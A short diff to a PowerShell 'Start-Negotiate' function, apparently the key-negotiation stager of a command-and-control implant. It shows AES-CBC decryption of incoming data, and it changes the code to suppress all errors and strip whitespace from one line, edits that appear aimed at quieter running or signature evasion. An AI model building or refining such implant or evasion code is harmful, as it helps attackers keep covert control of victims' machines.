@@ -56,7 +56,7 @@ function Start-Negotiate {
                 $AES=New-Object System.Security.Cryptography.RijndaelManaged;
             }
             $AES.Mode = "CBC";
-            $AES.Key = $e.GetBytes($Key);
+            $AES.Key=$e.GetBytes($Key);
             $AES.IV = $IV;
             ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
         }
@@ -94,7 +94,7 @@ function Start-Negotiate {
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
-    # $ErrorActionPreference = "SilentlyContinue";
+    $ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::UTF8;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
